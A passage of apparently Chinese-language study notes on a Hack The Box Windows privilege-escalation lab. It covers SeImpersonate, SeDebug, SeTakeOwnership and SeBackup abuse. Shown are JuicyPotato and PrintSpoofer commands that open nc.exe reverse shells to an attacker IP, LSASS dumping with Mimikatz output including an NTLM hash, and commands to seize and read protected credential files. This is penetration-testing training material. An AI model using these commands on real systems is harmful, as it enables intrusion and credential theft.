[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install</code></pre>
<p>有了这个访问权限，我们可以确认我们确实是在 SQL Server 服务账户的上下文中运行的。</p>
<ol><li>Confirming Access</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01</code></pre>
<ol><li>Checking Account Privileges</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   </code></pre>
<p>命令 <code>whoami /priv</code> 确认 <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" rel="noreferrer" target="_blank">SeImpersonatePrivilege</a> 已被列出。该特权可用于冒充如 <code>NT AUTHORITY\SYSTEM</code> 等特权账户。<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">JuicyPotato</a> 可以通过 DCOM/NTLM 反射滥用来利用 <code>SeImpersonate</code> 或 <code>SeAssignPrimaryToken</code> 的权限。</p>
<p>为了利用这些权限升级权限，首先下载 <code>JuicyPotato.exe</code> 二进制文件并上传，并 <code>nc.exe</code> 到目标服务器。接着，在 8443 端口建立一个 Netcat 监听器，执行以下命令，其中 <code>-l</code> 是 COM 服务器监听端口， <code>-p</code> 是启动程序（cmd.exe）， <code>-a</code> 是传递给 cmd.exe 的参数， <code>-t</code> 是 <code>createprocess</code> 调用。 下面，我们告诉该工具同时尝试 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" rel="noreferrer" target="_blank">CreateProcessWithTokenW</a> 和 <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera" rel="noreferrer" target="_blank">CreateProcessAsUser</a> 函数，这两者分别需要 <code>SeImpersonate</code> 或 <code>SeAssignPrimaryToken</code> 权限。</p>
<ol><li>Escalating Privileges Using JuicyPotato</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.38 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08</code></pre>
<p>此过程成功完成，并接收到一个名为 <code>NT AUTHORITY\SYSTEM</code> 的壳。</p>
<ol><li>Catching SYSTEM Shell</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32&gt;whoami

whoami
nt authority\system


C:\Windows\system32&gt;hostname

hostname
WINLPE-SRV01</code></pre>
<p><strong>PringSpoofer and RoguePotato</strong> JuicyPotato 无法支持 Windows Server 2019 和 Windows 10 版本 1809 及以后版本。然而，<a href="https://github.com/itm4n/PrintSpoofer" rel="noreferrer" target="_blank">PrintSpoofer</a> 和 <a href="https://github.com/antonioCoco/RoguePotato" rel="noreferrer" target="_blank">RoguePotato</a> 也可以利用相同的权限，获得 <code>NT 权威/系统</code>级别的访问权限。这篇博客文章深入介绍了 <code>PrintSpoofer</code> 工具，该工具可用于滥用 Windows 10 和 Server 2019 主机上的冒充权限，而 JuicyPotato 已无法正常工作。</p>
<p>让我们用 <code>PrintSpoofer</code> 工具试试看。我们可以用这个工具在你当前控制台中生成一个 SYSTEM 进程并与之交互，在桌面上生成一个 SYSTEM 进程（如果是本地登录或通过 RDP），或者捕捉反向 shell——我们在我们的示例中会做这件事。同样，连接 <code>mssqlclient.py</code>，使用带有 <code>-c</code> 参数的工具执行命令。这里，利用 <code>nc.exe</code> 生成反向 shell（Netcat 监听器在 8443 端口等待我们的攻击盒）。</p>
<ol><li>Escalating Privilege using PrintSpoofer</li></ol>
<pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.38 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL </code></pre>
<p>如果一切顺利，我们的 netcat 监听器将有一个 SYSTEM 壳。</p>
<ol><li>Catching Reverse Shell as SYSTEM</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Windows\system32&gt;whoami

whoami
nt authority\system</code></pre>
<h3>SeDebugPrivilege 调试权限</h3>
<p>为了运行某个特定应用程序或服务或协助故障排除，用户可能会被分配 <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs" rel="noreferrer" target="_blank">SeDebugPrivilege</a>，而不是将该账户添加到管理员组中。该权限可以通过本地或域组策略在 <code>Computer Settings &gt; Windows Settings &gt; Security Settings</code> .默认情况下，只有管理员拥有此权限，因为它可用于从系统内存中捕获敏感信息，或访问/修改内核和应用结构。该权利可能分配给需要在日常工作中调试新系统组件的开发者。该用户权利应谨慎授予，因为任何被分配的账户都会访问关键操作系统组件。</p>
<p>在内部渗透测试中，利用 LinkedIn 等网站收集潜在用户信息以进行定位通常很有帮助。假设我们正在使用 <code>Responder</code> 或 <code>Inveigh</code> 获取许多 NTLMv2 密码哈希值。在这种情况下，我们可能想将破解密码哈希的努力重点放在可能的高价值账户上，比如更可能被分配此类权限的开发者。用户可能不是主机的本地管理员，但拥有我们无法用 BloodHound 等工具远程枚举的权利。在我们为多个用户获取凭证，并且拥有一个或多个主机的 RDP 访问权限但没有额外权限的环境下，这点值得检查。</p>
<img alt="Pasted image 20260228032219" src="assets/posts/windows-privilege-escalation/Pasted image 20260228032219.png"/>
<p>作为被分配调试<code>程序</code>权限的用户登录并打开提升的 shell 后，我们看到 <code>SeDebugPrivilege</code> 被列为列表。</p>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set      </code></pre>
<p>我们可以利用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" rel="noreferrer" target="_blank">SysInternals</a> 套件中的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" rel="noreferrer" target="_blank">ProcDump</a> 来利用这一权限，转储进程内存。一个不错的候选是本地安全管理局子系统服务（<a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service" rel="noreferrer" target="_blank">LSASS</a>）进程，它在用户登录系统后存储用户凭证。</p>
<pre><code class="language-cmd-session">C:\htb&gt; procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.</code></pre>
<p>这成功了，我们可以在 <code>Mimikatz</code> 中使用 <code>sekurlsa：：minidump</code> 命令加载。在发送 <code>sekurlsa：：logonPasswords</code> 命令后，我们获得了本地登录的本地管理员账户的 NTLM 哈希值。我们可以利用这个方法进行“传递哈希”攻击，如果同一本地管理员密码被用于一个或多个额外系统（大型组织中常见），从而进行横向移动。</p>
<p>注意：在“Mimikatz”中运行任何命令前，最好先输入“log”，这样所有命令输出都会生成“.txt”文件。这在从可能存在多组凭证的服务器导出凭证时尤其有用。</p>
<pre><code class="language-cmd-session">C:\htb&gt; mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

&lt;SNIP&gt; 

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

&lt;SNIP&gt;</code></pre>
<p>假设我们因为某种原因无法在目标上加载工具，但拥有 RDP 访问权限。在这种情况下，我们可以通过任务管理器手动转储 <code>LSASS</code> 进程，方法是浏览“ <code>Details</code> ”标签，选择 <code>LSASS</code> 进程，然后选择 <code>Create dump file</code> 。将该文件下载回攻击系统后，我们可以用 Mimikatz 处理它，就像前面的例子一样。</p>
<img alt="Pasted image 20260228035858" src="assets/posts/windows-privilege-escalation/Pasted image 20260228035858.png"/>
<p><strong>先用procdump.exe来运行lsass.exe这个程序，之后转存其dump文件到mimikatz.exe的同目录下，并运行mimikatz.exe，在执行这三条命令<code>log</code> <code>sekurlsa::minidump lsass.dmp</code> <code>sekurlsa::logonpasswords</code> ，就可以获得HTML哈希</strong></p>
<p><strong>作为SYSTEM的远程代码执行</strong> 我们也可以利用 <code>SeDebugPrivilege</code> 来实现 <a href="https://decoder.cloud/2018/02/02/getting-system/" rel="noreferrer" target="_blank">RCE</a>。利用这种技术，我们可以通过启动子进程 ，利用通过 <code>SeDebugPrivilege</code> 赋予账户的提升权限，改变正常系统行为，继承父进程的令牌并冒充它，从而将权限提升到 SYSTEM。如果我们以 SYSTEM 形式运行的父进程（指定目标进程或运行程序的进程 ID（或 PID），那么我们可以快速提升权限。让我们看看实际作。</p>
<p>首先，将这个 PoC 脚本传输到目标系统。接下来我们只需加载脚本，并用以下语法 <code>[MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,"")</code> 运行。注意，我们必须在末尾添加第三个空参数 <code>""</code>，这样 PoC 才能正常工作。</p>
<p>首先，打开一个提升级的 PowerShell 控制台（右键点击，以管理员身份运行，输入 <code>Jordan</code> 用户的凭据）。接着，输入<code>任务列表</code> ，获取正在运行的进程及其相关 PID 的列表。</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K</code></pre>
<p>这里我们可以针对运行在 PID 612 下的 <code>winlogon.exe</code>，我们知道它在 Windows 主机上作为 SYSTEM 运行。</p>
<p>我们也可以使用 <a href="https://docs.microsoft.com/en-us/PowerShell/module/microsoft.PowerShell.management/get-process?view=PowerShell-7.2" rel="noreferrer" target="_blank">Get-Process</a> cmdlet 抓取一个知名进程（如 LSASS）的 PID，并直接传递给脚本，从而减少所需的步骤。</p>
<img alt="Pasted image 20260228040031" src="assets/posts/windows-privilege-escalation/Pasted image 20260228040031.png"/>
<p>还有类似这样的工具，可以在我们有 <code>SeDebugPrivilege</code> 时弹出 SYSTEM shell。通常我们无法通过 RDP 访问主机，因此必须修改 PoC，要么将反向 shell 返回攻击主机，作为 SYSTEM，要么通过其他命令，比如添加管理员用户。试着玩玩这些 PoC，看看还有什么其他方式可以实现 SYSTEM 访问，尤其是当你没有完全交互式的会话时，比如实现命令注入，或者作为 <code>SeDebugPrivilege</code> 的用户拥有网页壳或反向 shell 连接。请记住这些例子，以防你遇到倾销 LSASS 无法获得有用凭证的情况（虽然我们可以通过机器的 NTLM 哈希获得 SYSTEM 访问权限，但这超出本模块范围），并且用 shell 或 RCE 作为 SYSTEM 会很有帮助。</p>
<h3>SeTakeOwnershipPrivilege 取得所有权权限</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects" rel="noreferrer" target="_blank">SeTakeOwnershipPrivilege</a> 赋予用户对任何“可保护对象”的所有权，即 Active Directory 对象、NTFS 文件/文件夹、打印机、注册表键、服务和进程。该权限赋予 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights" rel="noreferrer" target="_blank">WRITE_OWNER</a> 对对象的权利，意味着用户可以在对象的安全描述符内更改所有者。管理员默认被赋予此权限。虽然很少遇到具有此权限的标准用户账户，但我们可能会遇到例如被赋予该权限的服务账户，负责运行备份作业和 VSS 快照。它还可能被赋予一些其他账户，如 <code>SeBackupPrivilege</code>、<code>SeRestorePrivilege</code> 和 <code>SeSecurityPrivilege</code>，以更细致地控制该账户的权限，而不赋予账户完整的本地管理员权限。这些特权本身很可能被用来升级特权。不过，有时我们可能需要对特定文件负责，因为其他方法被阻挡，或者其他方法无法如预期般工作。滥用这种特权有点特殊。不过，深入理解还是值得的，尤其是因为在 Active Directory 环境中，我们可能会遇到这样一种情景，可以将这项权利分配给特定用户，并利用它来读取文件共享上的敏感文件。</p>
<p><strong>WRITE_OWNER 权限</strong> 意思是：</p>
<blockquote>你可以修改对象的 Owner 字段。</blockquote>
<p>注意一个关键逻辑： <strong>Windows 有个隐藏规则：</strong> <strong>对象的所有者天然有权修改 DACL。</strong> 所以攻击链是：</p>
<ol><li>你用 SeTakeOwnershipPrivilege 把文件“抢过来”</li><li>你成为 Owner</li><li>作为 Owner，你可以修改 ACL</li><li>给自己 Full Control</li><li>然后随便读写</li></ol>
<p>这就是它危险的地方。</p>
<img alt="Pasted image 20260228044423" src="assets/posts/windows-privilege-escalation/Pasted image 20260228044423.png"/>
<p>该设置可以在组策略中设置：</p>
<p><code>计算机配置</code> ⇾ <code>Windows 设置</code> ⇾ <code>安全设置</code> ⇾ <code>本地策略</code> ⇾ <code>用户权限分配</code></p>
<ul><li><code>Computer Configuration</code> ⇾ <code>Windows Settings</code> ⇾ <code>Security Settings</code> ⇾ <code>Local Policies</code> ⇾ <code>User Rights Assignment</code></li></ul>
<img alt="Pasted image 20260228044443" src="assets/posts/windows-privilege-escalation/Pasted image 20260228044443.png"/>
<p>有了此权限，用户可以拥有任何文件或对象的所有权，并进行涉及敏感数据访问、 <code>远程代码执行</code> （<code>RCE</code>）或<code>拒绝服务</code> （DOS）的更改。</p>
<p>假设我们遇到拥有此权限的用户，或通过使用 <a href="https://github.com/FSecureLABS/SharpGPOAbuse" rel="noreferrer" target="_blank">SharpGPOAbuse</a> 等攻击（如 GPO 滥用）赋予该权限。在这种情况下，我们可以利用这个权限来控制共享文件夹或敏感文件，比如包含密码的文档或 SSH 密钥。</p>
<p><strong>利用权限, Leveraging the Privilege</strong></p>
<ol><li>审查当前用户权限</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled</code></pre>
<p>从输出中注意，该权限未被启用。我们可以使用这个脚本来启用它，这个脚本在这篇博客文章中有详细介绍，也可以用这个脚本，它基于最初的概念展开。</p>
<ol><li>Enabling SeTakeOwnershipPrivilege</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Import-Module .\Enable-Privilege.ps1
PS C:\htb&gt; .\EnableAllTokenPrivs.ps1
PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled</code></pre>
<pre><code>PS C:\TakeOwn&gt; icacls C:\TakeOwn\flag.txt /grant "$env:USERNAME\`:(F)"
processed file: C:\TakeOwn\flag.txt
Successfully processed 1 files; Failed processing 0 files
PS C:\TakeOwn&gt; type flag.txt
1m_th3_f1l3_0wn3r_n0W!
PS C:\TakeOwn&gt;
</code></pre>
<p>接下来，选择一个目标文件并确认当前的所有权。就我们的目的而言，我们将针对一个在文件共享中找到的有趣文件。常见文件<code>共享是公共</code>和<code>私有</code>目录，并由部门设立子目录。鉴于用户在公司中的角色，他们通常可以访问特定的文件或目录。即使有这样的结构，系统管理员也可能错误配置目录和子目录权限，这使得文件共享成为我们获得 Active Directory 凭证（有时甚至不需要凭证）的丰富信息来源。在我们的情景中，假设我们能够访问目标公司的文件共享，并且可以自由浏览<code>私有</code>和<code>公共</code>子目录。大多数情况下，我们发现权限设置非常严格，且没有发现关于文件共享的<code>公开</code>部分有任何有趣的信息。在浏览<code>私密</code>部分时，我们发现所有域用户可以列出某些子目录的内容，但在尝试读取大多数文件内容时会收到<code>拒绝访问</code>的提示。在列举过程中，我们在<code>私有</code>共享文件夹的 <code>IT</code> 子目录下发现了一个名为 <code>cred.txt</code> 的文件。</p>
<ol><li>选择目标文件</li></ol>
<p>鉴于我们的用户账户拥有 <code>SeTakeOwnershipPrivilege</code>（可能已经被授予），或者我们利用其他错误配置，比如过于宽松的组策略对象（GPO）赋予该权限），我们可以利用它读取任意文件。</p>
<p>让我们看看我们的目标档案，以获取更多相关信息。</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive</code></pre>
<p>我们可以看到所有者没有显示，这意味着我们可能没有足够的权限去查看这些细节。我们可以倒带一点，查查 IT 目录的所有者。</p>
<ol><li>检查文件所有权</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    &lt;DIR&gt;          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    &lt;DIR&gt;          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free</code></pre>
<p>我们可以看到 IT 共享似乎属于一个服务账户，并且确实包含一个文件 <code>cred.txt</code> 里面有一些数据。</p>
<p>现在我们可以用 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown" rel="noreferrer" target="_blank">Takeown</a> Windows 二进制文件来更改文件的所有权。</p>
<ol><li>接管文件的所有权</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".</code></pre>
<p>我们可以用之前的同一个命令确认所有权。我们现在看到我们的用户账户是文件所有者。</p>
<ol><li>确认所有权变更</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student</code></pre>
<p>我们可能仍然无法读取文件，需要用 <code>ICACL</code> 修改文件 ACL 才能读取。</p>
<ol><li>修改为文件的ACL</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand</code></pre>
<p>我们先赋予用户对目标文件的全部权限。</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files</code></pre>
<p>如果一切按计划进行，我们现在可以从命令行读取目标文件，如果有 RDP 权限就打开它，或者复制到我们的攻击系统进行额外处理（比如破解 KeePass 数据库的密码）。</p>
<ol><li>阅读文件</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin
 
root:n1X_p0wer_us3er!</code></pre>
<p>完成这些更改后，我们会尽一切努力恢复权限和文件所有权。如果因某种原因无法做到，我们应通知客户，并在报告交付物的附录中详细记录修改内容。再次强调，利用这种许可可能被视为破坏性行为，必须非常谨慎地进行。有些客户可能希望我们记录执行该动作的能力作为配置错误的证据，但由于潜在影响，我们不会充分利用该漏洞。</p>
<p><strong>何时使用？</strong> 值得关注的文件</p>
<pre><code class="language-shell-session">c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav</code></pre>
<h2>Windows 组权限</h2>
<p><strong>Windows Built-in</strong></p>
<p>如 <code>Windows 权限概览</code>部分所述，Windows 服务器，尤其是域控制器，内置了多种组，这些组要么随操作系统自带，要么在系统安装 Active Directory 域服务角色以将服务器升级为域控制器时添加。许多这些组织会赋予成员特殊权限，有些甚至可以用于提升服务器或域控制器的权限。 这里列出了所有内置的 Windows 组，并附有每个组的详细描述。本页面详细列出了 Active Directory 中特权账户和组的列表。无论我们是否访问了其中一个或多个成员账户，或在评估过程中发现自己在其中一个或多个群体中存在过多/不必要的成员身份，都必须理解这些群体成员身份的影响。在我们的目的上，我们将重点介绍以下内置组。这些组从 Server 2008 R2 一直存在至今，除了 Hyper-V 管理员（由 Server 2012 引入）。</p>
<p>账户可以分配给这些组，以强制执行最小权限，避免为执行特定任务（如备份）而创建更多域管理员和企业管理员。有时供应商应用还会要求某些权限，可以通过将服务账户分配给这些组之一来获得。账户也可能因意外添加，或在测试特定工具或脚本后遗留。我们应始终检查这些小组，并在报告中附录每个小组成员名单，供客户审核并判断是否仍需访问。</p>
<div class="post-table-wrap"><table><thead><tr><th>备用</th><th>事件日志阅读器</th><th>管理员</th></tr></thead><tbody><tr><td>管理员</td><td>打印</td><td>服务器运营者</td></tr></tbody></table></div>
<h3>Backup Operators 备份操作员</h3>
<p>在登录到目标机器后，我们可以使用命令 <code>whoami /groups</code> 显示当前的组成员。加入该组成员可获得 <code>SeBackup</code> 和 <code>SeRestore</code> 的特权。<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges" rel="noreferrer" target="_blank">SeBackupPrivilege</a> 允许我们遍历任何文件夹并列出文件夹内容。这样即使文件夹的访问控制列表（ACL）中没有访问控制条目（ACE），也能让我们从文件夹复制文件。然而，我们无法使用标准的复制命令来实现这一点。相反，我们需要程序化地复制数据，并确保指定 <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea" rel="noreferrer" target="_blank">FILE_FLAG_BACKUP_SEMANTICS</a> 标志。</p>
<p><strong>如何在未获得必要权限的情况下访问敏感信息。</strong></p>
<p>我们可以利用这个 <a href="https://github.com/giuliano108/SeBackupPrivilege" rel="noreferrer" target="_blank">PoC</a> 来利用 <code>SeBackupPrivilege</code>，复制这个文件。首先，让我们在 PowerShell 会话中导入库。</p>
<ol><li>Importing Libraries</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll</code></pre>
<p>我们来检查一下是否启用<code>了 SeBackupPrivilege</code>，方法是调用 <code>whoami /priv</code> 或 <code>Get-SeBackupPrivilege</code> cmdlet。如果该权限被禁用，我们可以用 <code>Set-SeBackupPrivilege</code> 来启用它。 &gt;注意：根据服务器设置，可能需要生成一个提升的 CMD 提示来绕过 UAC 并获得此权限。</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-SeBackupPrivilege

SeBackupPrivilege is disabled</code></pre>
<p>如果该权限被禁用，我们可以用 <code>Set-SeBackupPrivilege</code> 来启用它。</p>
<ol><li>Enabling SeBackupPrivilege</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Set-SeBackupPrivilege
PS C:\htb&gt; Get-SeBackupPrivilege

SeBackupPrivilege is enabled</code></pre>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p>如上所述，该特权是成功实现的。现在可以利用这一权限复制任何受保护的文件。</p>
<ol><li>Copying a Protected File</li></ol>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt


PS C:\htb&gt; cat 'C:\Confidential\2021 Contract.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
At line:1 char:1
+ cat 'C:\Confidential\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
   izedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand</code></pre>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes


PS C:\htb&gt;  cat .\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:

